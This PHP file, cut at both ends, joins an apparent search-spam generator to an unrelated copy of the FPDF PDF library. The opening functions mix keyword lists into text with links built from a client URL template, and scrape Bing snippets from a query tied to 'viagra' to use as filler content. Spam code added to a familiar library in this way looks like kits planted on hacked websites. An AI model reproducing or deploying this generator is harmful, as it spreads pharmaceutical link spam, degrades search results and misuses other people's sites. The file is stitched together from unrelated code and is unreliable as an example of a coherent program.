						$_rand_el = trim($_elem_groups[array_rand($_elem_groups) ]);
					}else{
						$_rand_el = trim($_keyfile_data[$_i]);
					}
					$_group_results[rand(0, count($_group_results) - 1) ].= " " . $_rand_el;
				}
			}
		}
	}
	if ($_incom_nums > 0){
		shuffle($_keyfile_data);
		if (count($_keyfile_data) < $_incom_nums - 1){
			$_incom_nums = count($_keyfile_data);
		}
		$_result_good = ""; 
		if (empty($_result_good)){
			for ($_i = 1; $_i <= $_incom_nums; $_i++){
				$_group_results[rand(0, count($_group_results) - 1) ].= ' <a href="http://' . str_replace("[KEY]", str_replace(" ", "-", trim($_keyfile_data[$_i])) , $_clienturl) . '">' . ucfirst(trim($_keyfile_data[$_i])) . "</a>";
			}
		}
	}
	$_group_results = trim(implode(" ", $_group_results));
	$_group_results = htmlentities($_group_results);
	return $_group_results;
}

function bingcontent($key, $_lang)
{
	if (mb_detect_encoding($key) == "UTF-8"):
		$key = trim($key);
	else:
		$key = iconv(mb_detect_encoding($key) , "UTF-8", $key);
		$key = trim($key);
	endif;
	$key = urlencode($key);
	$newcontent = array();
	for ($_i = 0; $_i <= 10; $_i++) {
		$urlsbing[] = "http://www.bing.com/search?q=" . $key . "&qs=n&form=QBLH&pq=viagra&first=" . $_i . "1&setmkt=" . $_lang . "&setlang=" . $_lang . "&setplang=" . $_lang;
	}

	$_pattern = "|<\/span><\/div><p>(.*)<\/p><\/div|iU";
	$_pattern_content = array(
		" ...",
		"...",
		"....",
		"..",
		"!.",
		"?.",
		"http://",
		"https://",
		"http:"
	);
	$curldatabing = curlMultiRequest($urlsbing);
	foreach($curldatabing as $value) {
		$_response = str_replace("\n", " ", $value);
		preg_match_all($_pattern, $_response, $_matches);
		if (!empty($_matches)) {
			$_content = implode(". ", $_matches[1]);
			$_content = preg_replace('#<a.*>.*</a>#USi','',$_content);
			$_content = str_replace($_pattern_content, ". ", $_content);
			$newcontent[] = $_content . ". ";
		}
	}
	$newcontent = implode($newcontent);
	$newcontent = strip_tags($newcontent);
	if (mb_detect_encoding($newcontent) == "UTF-8"):
		$newcontent = trim($newcontent);
	else:
		$newcontent = iconv(mb_detect_encoding($newcontent) , "UTF-8", $newcontent);
		$newcontent = trim($newcontent);
	endif;
	return $newcontent;
}

function curlMultiRequest($urls, $options = array()){
	global $useCurl, $requestTimeout;
	
	$req = new HttpRequest($useCurl, $requestTimeout);
	foreach($urls as $url){
		$tasks[$url] = $req->request($url);
	}
	return $tasks;
	
}

class HttpRequest{
  var $mode = 0;
  var $timeout = 60;
  function HttpRequest($mode = 0, $timeout = 60) {
    $this->mode = ($mode == 0 && function_exists('curl_init') ? 0 : 1);
    $this->timeout = $timeout;
  }
  function request($url, $post_data = false) {
    switch ($this->mode){
    case 0:
      return $this->_requestCurl($url, $post_data);
    case 1:
      return file_get_contents($url);
    default:
      return false;
    };
  }
 
  function _requestCurl($url, $post_data) {
    $hc = curl_init($url);
    if ($post_data)
      curl_setopt($hc, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($hc, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($hc, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($hc, CURLOPT_AUTOREFERER, 1);
    curl_setopt($hc, CURLOPT_CONNECTTIMEOUT, $this->timeout);
    $res = curl_exec($hc);
    $this->httpStatus = curl_getinfo($hc, CURLINFO_HTTP_CODE);
    curl_close($hc);
    return $res;
  }
};
 


class FPDF
{
var $page;               // current page number
var $n;                  // current object number
var $offsets;            // array of object offsets
var $buffer;             // buffer holding in-memory PDF
var $pages;              // array containing pages
var $state;              // current document state
var $compress;           // compression flag
var $k;                  // scale factor (number of points in user unit)
var $DefOrientation;     // default orientation
var $CurOrientation;     // current orientation
var $StdPageSizes;       // standard page sizes
var $DefPageSize;        // default page size
var $CurPageSize;        // current page size
var $PageSizes;          // used for pages with non default sizes or orientations
var $wPt, $hPt;          // dimensions of current page in points
var $w, $h;              // dimensions of current page in user unit
var $lMargin;            // left margin
var $tMargin;            // top margin
var $rMargin;            // right margin
var $bMargin;            // page break margin
var $cMargin;            // cell margin
var $x, $y;              // current position in user unit
var $lasth;              // height of last printed cell
var $LineWidth;          // line width in user unit
var $fontpath;           // path containing fonts
var $CoreFonts;          // array of core font names
var $fonts;              // array of used fonts
var $FontFiles;          // array of font files
var $diffs;              // array of encoding differences
var $FontFamily;         // current font family
var $FontStyle;          // current font style
var $underline;          // underlining flag
var $CurrentFont;        // current font info
var $FontSizePt;         // current font size in points
var $FontSize;           // current font size in user unit
var $DrawColor;          // commands for drawing color
var $FillColor;          // commands for filling color
var $TextColor;          // commands for text color
var $ColorFlag;          // indicates whether fill and text colors are different
var $ws;                 // word spacing
var $images;             // array of used images
var $PageLinks;          // array of links in pages
var $links;              // array of internal links
var $AutoPageBreak;      // automatic page breaking
var $PageBreakTrigger;   // threshold used to trigger page breaks
var $InHeader;           // flag set when processing header
var $InFooter;           // flag set when processing footer
var $ZoomMode;           // zoom display mode
var $LayoutMode;         // layout display mode
var $title;              // title
var $subject;            // subject
var $author;             // author
var $keywords;           // keywords
var $creator;            // creator
var $AliasNbPages;       // alias for total number of pages
var $PDFVersion;         // PDF version number

/*******************************************************************************
*                                                                              *
*                               Public methods                                 *
*                                                                              *
*******************************************************************************/
function FPDF($orientation='P', $unit='mm', $size='A4')
{
	// Some checks
	$this->_dochecks();
	// Initialization of properties
	$this->page = 0;
	$this->n = 2;
	$this->buffer = '';
	$this->pages = array();
	$this->PageSizes = array();
	$this->state = 0;
	$this->fonts = array();
	$this->FontFiles = array();
	$this->diffs = array();
	$this->images = array();
	$this->links = array();
	$this->InHeader = false;
	$this->InFooter = false;
	$this->lasth = 0;
	$this->FontFamily = '';
	$this->FontStyle = '';
	$this->FontSizePt = 12;
	$this->underline = false;
	$this->DrawColor = '0 G';
	$this->FillColor = '0 g';
	$this->TextColor = '0 g';
	$this->ColorFlag = false;
	$this->ws = 0;
	// Font path
	if(defined('FPDF_FONTPATH'))
	{
		$this->fontpath = FPDF_FONTPATH;
		if(substr($this->fontpath,-1)!='/' && substr($this->fontpath,-1)!='\\')
			$this->fontpath .= '/';
	}
	elseif(is_dir(dirname(__FILE__).'/font'))
		$this->fontpath = dirname(__FILE__).'/font/';
	else
		$this->fontpath = '';
	// Core fonts
	$this->CoreFonts = array('courier', 'helvetica', 'times', 'symbol', 'zapfdingbats');
	// Scale factor
	if($unit=='pt')
		$this->k = 1;
	elseif($unit=='mm')
		$this->k = 72/25.4;
	elseif($unit=='cm')
		$this->k = 72/2.54;
	elseif($unit=='in')
		$this->k = 72;
	else
		$this->Error('Incorrect unit: '.$unit);
	// Page sizes
	$this->StdPageSizes = array('a3'=>array(841.89,1190.55), 'a4'=>array(595.28,841.89), 'a5'=>array(420.94,595.28),
		'letter'=>array(612,792), 'legal'=>array(612,1008));
	$size = $this->_getpagesize($size);
	$this->DefPageSize = $size;
	$this->CurPageSize = $size;
	// Page orientation
	$orientation = strtolower($orientation);
	if($orientation=='p' || $orientation=='portrait')
	{
		$this->DefOrientation = 'P';
		$this->w = $size[0];
		$this->h = $size[1];
	}
	elseif($orientation=='l' || $orientation=='landscape')
	{
		$this->DefOrientation = 'L';
		$this->w = $size[1];
		$this->h = $size[0];
	}
	else
		$this->Error('Incorrect orientation: '.$orientation);
	$this->CurOrientation = $this->DefOrientation;
	$this->wPt = $this->w*$this->k;
	$this->hPt = $this->h*$this->k;
	// Page margins (1 cm)
	$margin = 28.35/$this->k;
	$this->SetMargins($margin,$margin);
	// Interior cell margin (1 mm)
	$this->cMargin = $margin/10;
	// Line width (0.2 mm)
	$this->LineWidth = .567/$this->k;
	// Automatic page break
	$this->SetAutoPageBreak(true,2*$margin);
	// Default display mode
	$this->SetDisplayMode('default');
	// Enable compression
	$this->SetCompression(true);
	// Set default PDF version number
	$this->PDFVersion = '1.3';
}

function SetMargins($left, $top, $right=null)
{
	// Set left, top and right margins
	$this->lMargin = $left;
	$this->tMargin = $top;
	if($right===null)
		$right = $left;
	$this->rMargin = $right;
}

function SetLeftMargin($margin)
{
	// Set left margin
	$this->lMargin = $margin;
	if($this->page>0 && $this->x<$margin)
		$this->x = $margin;
}

function SetTopMargin($margin)
{
	// Set top margin
	$this->tMargin = $margin;
}

function SetRightMargin($margin)
{
	// Set right margin
	$this->rMargin = $margin;
}

function SetAutoPageBreak($auto, $margin=0)
{
	// Set auto page break mode and triggering margin
	$this->AutoPageBreak = $auto;
	$this->bMargin = $margin;
	$this->PageBreakTrigger = $this->h-$margin;
}

function SetDisplayMode($zoom, $layout='default')
{
	// Set display mode in viewer
	if($zoom=='fullpage' || $zoom=='fullwidth' || $zoom=='real' || $zoom=='default' || !is_string($zoom))
		$this->ZoomMode = $zoom;
	else
		$this->Error('Incorrect zoom display mode: '.$zoom);
	if($layout=='single' || $layout=='continuous' || $layout=='two' || $layout=='default')
		$this->LayoutMode = $layout;
	else
		$this->Error('Incorrect layout display mode: '.$layout);
}

function SetCompression($compress)
{
	// Set page compression
	if(function_exists('gzcompress'))
		$this->compress = $compress;
	else
		$this->compress = false;
}

function SetTitle($title, $isUTF8=false)
{
	// Title of document
	if($isUTF8)
		$title = $this->_UTF8toUTF16($title);
	$this->title = $title;
}

function SetSubject($subject, $isUTF8=false)
{
	// Subject of document
	if($isUTF8)
		$subject = $this->_UTF8toUTF16($subject);
	$this->subject = $subject;
}

function SetAuthor($author, $isUTF8=false)
{
	// Author of document
	if($isUTF8)
		$author = $this->_UTF8toUTF16($author);
	$this->author = $author;
}

function SetKeywords($keywords, $isUTF8=false)
{
	// Keywords of document
	if($isUTF8)
		$keywords = $this->_UTF8toUTF16($keywords);
	$this->keywords = $keywords;
}

function SetCreator($creator, $isUTF8=false)
{
	// Creator of document
	if($isUTF8)
		$creator = $this->_UTF8toUTF16($creator);
	$this->creator = $creator;
}

function AliasNbPages($alias='{nb}')
{
	// Define an alias for total number of pages
	$this->AliasNbPages = $alias;
}

function Error($msg)
{
	// Fatal error
	die('<b>FPDF error:</b> '.$msg);
}

function Open()
{
	// Begin document
	$this->state = 1;
}

function Close()
{
	// Terminate document
	if($this->state==3)
		return;
	if($this->page==0)
		$this->AddPage();
	// Page footer
	$this->InFooter = true;
	$this->Footer();
	$this->InFooter = false;
	// Close page
	$this->_endpage();
	// Close document
	$this->_enddoc();
}

function AddPage($orientation='', $size='')
{
	// Start a new page
	if($this->state==0)
		$this->Open();
	$family = $this->FontFamily;
	$style = $this->FontStyle.($this->underline ? 'U' : '');
	$fontsize = $this->FontSizePt;
	$lw = $this->LineWidth;
	$dc = $this->DrawColor;
	$fc = $this->FillColor;
	$tc = $this->TextColor;
	$cf = $this->ColorFlag;
	if($this->page>0)
	{
		// Page footer
		$this->InFooter = true;
		$this->Footer();
		$this->InFooter = false;
		// Close page
		$this->_endpage();
	}
	// Start new page
	$this->_beginpage($orientation,$size);
	// Set line cap style to square
	$this->_out('2 J');
	// Set line width
	$this->LineWidth = $lw;
	$this->_out(sprintf('%.2F w',$lw*$this->k));
	// Set font
	if($family)
		$this->SetFont($family,$style,$fontsize);
	// Set colors
	$this->DrawColor = $dc;
	if($dc!='0 G')
		$this->_out($dc);
	$this->FillColor = $fc;
	if($fc!='0 g')
		$this->_out($fc);
	$this->TextColor = $tc;
	$this->ColorFlag = $cf;
	// Page header
	$this->InHeader = true;
	$this->Header();
	$this->InHeader = false;
	// Restore line width
	if($this->LineWidth!=$lw)
	{
		$this->LineWidth = $lw;
		$this->_out(sprintf('%.2F w',$lw*$this->k));
	}
	// Restore font
	if($family)
		$this->SetFont($family,$style,$fontsize);
	// Restore colors
	if($this->DrawColor!=$dc)
	{
		$this->DrawColor = $dc;
		$this->_out($dc);
	}
	if($this->FillColor!=$fc)
	{
		$this->FillColor = $fc;
		$this->_out($fc);
	}
	$this->TextColor = $tc;
	$this->ColorFlag = $cf;
}

function Header()
{
	// To be implemented in your own inherited class
}

function Footer()
{
	// To be implemented in your own inherited class
}

function PageNo()
{
	// Get current page number
	return $this->page;
}

function SetDrawColor($r, $g=null, $b=null)
{
	// Set color for all stroking operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->DrawColor = sprintf('%.3F G',$r/255);
	else
		$this->DrawColor = sprintf('%.3F %.3F %.3F RG',$r/255,$g/255,$b/255);
	if($this->page>0)
		$this->_out($this->DrawColor);
}

function SetFillColor($r, $g=null, $b=null)
{
	// Set color for all filling operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->FillColor = sprintf('%.3F g',$r/255);
	else
		$this->FillColor = sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag = ($this->FillColor!=$this->TextColor);
	if($this->page>0)
		$this->_out($this->FillColor);
}

function SetTextColor($r, $g=null, $b=null)
{
	// Set color for text
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->TextColor = sprintf('%.3F g',$r/255);
	else
		$this->TextColor = sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag = ($this->FillColor!=$this->TextColor);
}

function GetStringWidth($s)
{
	// Get width of a string in the current font
	$s = (string)$s;
	$cw = &$this->CurrentFont['cw'];
	$w = 0;
	$l = strlen($s);
	for($i=0;$i<$l;$i++)
		$w += $cw[$s[$i]];
	return $w*$this->FontSize/1000;
}

function SetLineWidth($width)
{
	// Set line width
	$this->LineWidth = $width;
	if($this->page>0)
		$this->_out(sprintf('%.2F w',$width*$this->k));
}

function Line($x1, $y1, $x2, $y2)
{
	// Draw a line
	$this->_out(sprintf('%.2F %.2F m %.2F %.2F l S',$x1*$this->k,($this->h-$y1)*$this->k,$x2*$this->k,($this->h-$y2)*$this->k));
}

function Rect($x, $y, $w, $h, $style='')
{
	// Draw a rectangle
	if($style=='F')
		$op = 'f';
	elseif($style=='FD' || $style=='DF')
		$op = 'B';
	else
		$op = 'S';
	$this->_out(sprintf('%.2F %.2F %.2F %.2F re %s',$x*$this->k,($this->h-$y)*$this->k,$w*$this->k,-$h*$this->k,$op));
}

function AddFont($family, $style='', $file='')
{
	// Add a TrueType, OpenType or Type1 font
	$family = strtolower($family);
	$style = strtoupper($style);
	if($style=='IB')
		$style = 'BI';
	$fontkey = $family.$style;
	if(isset($this->fonts[$fontkey]))
		return;
	$info = $this->_loadfont($file);
	$info['i'] = count($this->fonts)+1;
	if(!empty($info['diff']))
	{
		// Search existing encodings
		$n = array_search($info['diff'],$this->diffs);
		if(!$n)
		{
			$n = count($this->diffs)+1;
			$this->diffs[$n] = $info['diff'];
		}
		$info['diffn'] = $n;
	}
	if(!empty($info['file']))
	{
		// Embedded font
		if($info['type']=='TrueType')
			$this->FontFiles[$info['file']] = array('length1'=>$info['originalsize']);
		else
			$this->FontFiles[$info['file']] = array('length1'=>$info['size1'], 'length2'=>$info['size2']);
	}
	$this->fonts[$fontkey] = $info;
}

function SetFont($family, $style='', $size=0)
{
	// Select a font; size given in points
	if($family=='')
		$family = $this->FontFamily;
	else
		$family = strtolower($family);
	$style = strtoupper($style);
	if(strpos($style,'U')!==false)
	{
		$this->underline = true;
		$style = str_replace('U','',$style);
	}
	else
		$this->underline = false;
	if($style=='IB')
		$style = 'BI';
	if($size==0)
		$size = $this->FontSizePt;
	// Test if font is already selected
	if($this->FontFamily==$family && $this->FontStyle==$style && $this->FontSizePt==$size)
		return;
	// Test if font is already loaded
	$fontkey = $family.$style;
	if(!isset($this->fonts[$fontkey]))
	{
		// Test if one of the core fonts
		if($family=='arial')
			$family = 'helvetica';
		if(in_array($family,$this->CoreFonts))
		{
			if($family=='symbol' || $family=='zapfdingbats')
				$style = '';
			$fontkey = $family.$style;
			if(!isset($this->fonts[$fontkey]))
				$this->AddFont($family,$style);
		}
		else
			$this->Error('Undefined font: '.$family.' '.$style);
	}
	// Select it
	$this->FontFamily = $family;
	$this->FontStyle = $style;
	$this->FontSizePt = $size;
	$this->FontSize = $size/$this->k;
	$this->CurrentFont = &$this->fonts[$fontkey];
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function SetFontSize($size)
{
	// Set font size in points
	if($this->FontSizePt==$size)
		return;
	$this->FontSizePt = $size;
	$this->FontSize = $size/$this->k;
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function AddLink()
{
	// Create a new internal link
	$n = count($this->links)+1;
	$this->links[$n] = array(0, 0);
	return $n;
}

function SetLink($link, $y=0, $page=-1)
{
	// Set destination of internal link
	if($y==-1)
		$y = $this->y;
	if($page==-1)
		$page = $this->page;
	$this->links[$link] = array($page, $y);
}

function Link($x, $y, $w, $h, $link)
{
	// Put a link on the page
	$this->PageLinks[$this->page][] = array($x*$this->k, $this->hPt-$y*$this->k, $w*$this->k, $h*$this->k, $link);
}

function Text($x, $y, $txt)
{
	// Output a string
	$s = sprintf('BT %.2F %.2F Td (%s) Tj ET',$x*$this->k,($this->h-$y)*$this->k,$this->_escape($txt));
	if($this->underline && $txt!='')
		$s .= ' '.$this->_dounderline($x,$y,$txt);
	if($this->ColorFlag)
		$s = 'q '.$this->TextColor.' '.$s.' Q';
	$this->_out($s);
}

function AcceptPageBreak()
{
	// Accept automatic page break or not
	return $this->AutoPageBreak;
}

function Cell($w, $h=0, $txt='', $border=0, $ln=0, $align='', $fill=false, $link='')
{
	// Output a cell
	$k = $this->k;
	if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
	{
		// Automatic page break
		$x = $this->x;
		$ws = $this->ws;
		if($ws>0)
		{
			$this->ws = 0;
			$this->_out('0 Tw');
		}
		$this->AddPage($this->CurOrientation,$this->CurPageSize);
		$this->x = $x;
		if($ws>0)
		{
			$this->ws = $ws;
			$this->_out(sprintf('%.3F Tw',$ws*$k));
		}
	}
	if($w==0)
		$w = $this->w-$this->rMargin-$this->x;
	$s = '';
	if($fill || $border==1)
	{
		if($fill)
			$op = ($border==1) ? 'B' : 'f';
		else
			$op = 'S';
		$s = sprintf('%.2F %.2F %.2F %.2F re %s ',$this->x*$k,($this->h-$this->y)*$k,$w*$k,-$h*$k,$op);
	}
	if(is_string($border))
	{
		$x = $this->x;
		$y = $this->y;
		if(strpos($border,'L')!==false)
			$s .= sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,$x*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'T')!==false)
			$s .= sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-$y)*$k);
		if(strpos($border,'R')!==false)
			$s .= sprintf('%.2F %.2F m %.2F %.2F l S ',($x+$w)*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'B')!==false)
			$s .= sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-($y+$h))*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
	}
	if($txt!=='')
	{
		if($align=='R')
			$dx = $w-$this->cMargin-$this->GetStringWidth($txt);
		elseif($align=='C')
			$dx = ($w-$this->GetStringWidth($txt))/2;
		else
			$dx = $this->cMargin;
		if($this->ColorFlag)
			$s .= 'q '.$this->TextColor.' ';
		$txt2 = str_replace(')','\\)',str_replace('(','\\(',str_replace('\\','\\\\',$txt)));
		$s .= sprintf('BT %.2F %.2F Td (%s) Tj ET',($this->x+$dx)*$k,($this->h-($this->y+.5*$h+.3*$this->FontSize))*$k,$txt2);
		if($this->underline)
			$s .= ' '.$this->_dounderline($this->x+$dx,$this->y+.5*$h+.3*$this->FontSize,$txt);
		if($this->ColorFlag)
			$s .= ' Q';
		if($link)
			$this->Link($this->x+$dx,$this->y+.5*$h-.5*$this->FontSize,$this->GetStringWidth($txt),$this->FontSize,$link);
	}
	if($s)
		$this->_out($s);
	$this->lasth = $h;
	if($ln>0)
	{
		// Go to next line
		$this->y += $h;
		if($ln==1)
			$this->x = $this->lMargin;
	}
	else
		$this->x += $w;
}

function MultiCell($w, $h, $txt, $border=0, $align='J', $fill=false)
{
	// Output text with automatic or explicit line breaks
	$cw = &$this->CurrentFont['cw'];
	if($w==0)
		$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	if($nb>0 && $s[$nb-1]=="\n")
		$nb--;
	$b = 0;
	if($border)
	{
		if($border==1)
		{
			$border = 'LTRB';
			$b = 'LRT';
			$b2 = 'LR';
		}
		else
		{
			$b2 = '';
			if(strpos($border,'L')!==false)
				$b2 .= 'L';
			if(strpos($border,'R')!==false)
				$b2 .= 'R';
			$b = (strpos($border,'T')!==false) ? $b2.'T' : $b2;
		}
	}
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$ns = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		if($c=="\n")
		{
			// Explicit line break
			if($this->ws>0)
			{
				$this->ws = 0;
				$this->_out('0 Tw');
			}
			$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			$ns = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
			continue;
		}
		if($c==' ')
		{
			$sep = $i;
			$ls = $l;
			$ns++;
		}
		$l += $cw[$c];
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1)
			{
				if($i==$j)
					$i++;
				if($this->ws>0)
				{
					$this->ws = 0;
					$this->_out('0 Tw');
				}
				$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			}
			else
			{
				if($align=='J')
				{
					$this->ws = ($ns>1) ? ($wmax-$ls)/1000*$this->FontSize/($ns-1) : 0;
					$this->_out(sprintf('%.3F Tw',$this->ws*$this->k));
				}
				$this->Cell($w,$h,substr($s,$j,$sep-$j),$b,2,$align,$fill);
				$i = $sep+1;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			$ns = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
		}
		else
			$i++;
	}
	// Last chunk
	if($this->ws>0)
	{
		$this->ws = 0;
		$this->_out('0 Tw');
	}
	if($border && strpos($border,'B')!==false)
		$b .= 'B';
	$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
	$this->x = $this->lMargin;
}

function Write($h, $txt, $link='')
{
	// Output text in flowing mode
	$cw = &$this->CurrentFont['cw'];
	$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		if($c=="\n")
		{
			// Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
			continue;
		}
		if($c==' ')
			$sep = $i;
		$l += $cw[$c];
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1)
			{
				if($this->x>$this->lMargin)
				{
					// Move to next line
					$this->x = $this->lMargin;
					$this->y += $h;
					$w = $this->w-$this->rMargin-$this->x;
					$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
					$i++;
					$nl++;
					continue;
				}
				if($i==$j)
					$i++;
				$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),0,2,'',0,$link);
				$i = $sep+1;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
		}
		else
			$i++;
	}
	// Last chunk
	if($i!=$j)
		$this->Cell($l/1000*$this->FontSize,$h,substr($s,$j),0,0,'',0,$link);
}

function Ln($h=null)
{
	// Line feed; default value is last cell height
	$this->x = $this->lMargin;
	if($h===null)
		$this->y += $this->lasth;
	else
		$this->y += $h;
}

function Image($file, $x=null, $y=null, $w=0, $h=0, $type='', $link='')
{
	// Put an image on the page
	if(!isset($this->images[$file]))
	{
		// First use of this image, get info
		if($type=='')
		{
			$pos = strrpos($file,'.');
			if(!$pos)
				$this->Error('Image file has no extension and no type was specified: '.$file);
			$type = substr($file,$pos+1);
		}
		$type = strtolower($type);
		if($type=='jpeg')
			$type = 'jpg';
		$mtd = '_parse'.$type;
		if(!method_exists($this,$mtd))
			$this->Error('Unsupported image type: '.$type);
		$info = $this->$mtd($file);
		$info['i'] = count($this->images)+1;
		$this->images[$file] = $info;
	}
	else
		$info = $this->images[$file];

	// Automatic width and height calculation if needed
	if($w==0 && $h==0)
	{
		// Put image at 96 dpi
		$w = -96;
		$h = -96;
	}
	if($w<0)
		$w = -$info['w']*72/$w/$this->k;
	if($h<0)
		$h = -$info['h']*72/$h/$this->k;
	if($w==0)
		$w = $h*$info['w']/$info['h'];
	if($h==0)
		$h = $w*$info['h']/$info['w'];

	// Flowing mode
	if($y===null)
	{
		if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
		{
			// Automatic page break
			$x2 = $this->x;
			$this->AddPage($this->CurOrientation,$this->CurPageSize);
			$this->x = $x2;
		}
		$y = $this->y;
		$this->y += $h;
	}

	if($x===null)
		$x = $this->x;
	$this->_out(sprintf('q %.2F 0 0 %.2F %.2F %.2F cm /I%d Do Q',$w*$this->k,$h*$this->k,$x*$this->k,($this->h-($y+$h))*$this->k,$info['i']));
	if($link)
		$this->Link($x,$y,$w,$h,$link);
}

function GetX()
{
	// Get x position
	return $this->x;
}

function SetX($x)
{
	// Set x position
	if($x>=0)
		$this->x = $x;
	else
		$this->x = $this->w+$x;
}

function GetY()
{
	// Get y position
	return $this->y;
}

function SetY($y)
{
	// Set y position and reset x
	$this->x = $this->lMargin;
	if($y>=0)
		$this->y = $y;
	else
		$this->y = $this->h+$y;
}

function SetXY($x, $y)
{
	// Set x and y positions
	$this->SetY($y);
	$this->SetX($x);
}

function Output($name='', $dest='')
{
	// Output PDF to some destination
	if($this->state<3)
		$this->Close();
	$dest = strtoupper($dest);
	if($dest=='')
	{
		if($name=='')
		{
			$name = 'doc.pdf';
			$dest = 'I';
		}
		else
			$dest = 'F';
	}
	switch($dest)
	{
		case 'I':
			// Send to standard output
			$this->_checkoutput();
			if(PHP_SAPI!='cli')
			{
				// We send to a browser
				header('Content-Type: application/pdf');
				header('Content-Disposition: inline; filename="'.$name.'"');
				header('Cache-Control: private, max-age=0, must-revalidate');
				header('Pragma: public');
			}
			echo $this->buffer;
			break;
		case 'D':
			// Download file
			$this->_checkoutput();
			header('Content-Type: application/x-download');
			header('Content-Disposition: attachment; filename="'.$name.'"');
			header('Cache-Control: private, max-age=0, must-revalidate');
			header('Pragma: public');
			echo $this->buffer;
			break;
		case 'F':
			// Save to local file
			$f = fopen($name,'wb');
			if(!$f)
				$this->Error('Unable to create output file: '.$name);
			fwrite($f,$this->buffer,strlen($this->buffer));
			fclose($f);
			break;
		case 'S':
			// Return as a string
			return $this->buffer;
		default:
			$this->Error('Incorrect output destination: '.$dest);
	}
	return '';
}

/*******************************************************************************
*                                                                              *
*                              Protected methods                               *
*                                                                              *
*******************************************************************************/
function _dochecks()
{
	// Check availability of %F
	if(sprintf('%.1F',1.0)!='1.0')
		$this->Error('This version of PHP is not supported');
	// Check mbstring overloading
	if(ini_get('mbstring.func_overload') & 2)
		$this->Error('mbstring overloading must be disabled');
	// Ensure runtime magic quotes are disabled
	if(get_magic_quotes_runtime())
		@set_magic_quotes_runtime(0);
}

function _checkoutput()
{
	if(PHP_SAPI!='cli')
	{
		if(headers_sent($file,$line))
			$this->Error("Some data has already been output, can't send PDF file (output started at $file:$line)");
	}
	if(ob_get_length())
	{
		// The output buffer is not empty
		if(preg_match('/^(\xEF\xBB\xBF)?\s*$/',ob_get_contents()))
		{
			// It contains only a UTF-8 BOM and/or whitespace, let's clean it
			ob_clean();
		}
		else
			$this->Error("Some data has already been output, can't send PDF file");
	}
}

function _getpagesize($size)
{
	if(is_string($size))
	{
		$size = strtolower($size);
		if(!isset($this->StdPageSizes[$size]))
			$this->Error('Unknown page size: '.$size);
		$a = $this->StdPageSizes[$size];
		return array($a[0]/$this->k, $a[1]/$this->k);
	}
	else
	{
		if($size[0]>$size[1])
			return array($size[1], $size[0]);
		else
			return $size;
	}
}

function _beginpage($orientation, $size)
{
	$this->page++;
	$this->pages[$this->page] = '';
	$this->state = 2;
	$this->x = $this->lMargin;
	$this->y = $this->tMargin;
	$this->FontFamily = '';
	// Check page size and orientation
	if($orientation=='')
		$orientation = $this->DefOrientation;
	else
		$orientation = strtoupper($orientation[0]);
	if($size=='')
		$size = $this->DefPageSize;
	else
		$size = $this->_getpagesize($size);
	if($orientation!=$this->CurOrientation || $size[0]!=$this->CurPageSize[0] || $size[1]!=$this->CurPageSize[1])
	{
		// New size or orientation
		if($orientation=='P')
		{
			$this->w = $size[0];
			$this->h = $size[1];
		}
		else
		{
			$this->w = $size[1];
			$this->h = $size[0];
		}
		$this->wPt = $this->w*$this->k;
		$this->hPt = $this->h*$this->k;
		$this->PageBreakTrigger = $this->h-$this->bMargin;
		$this->CurOrientation = $orientation;
		$this->CurPageSize = $size;
	}
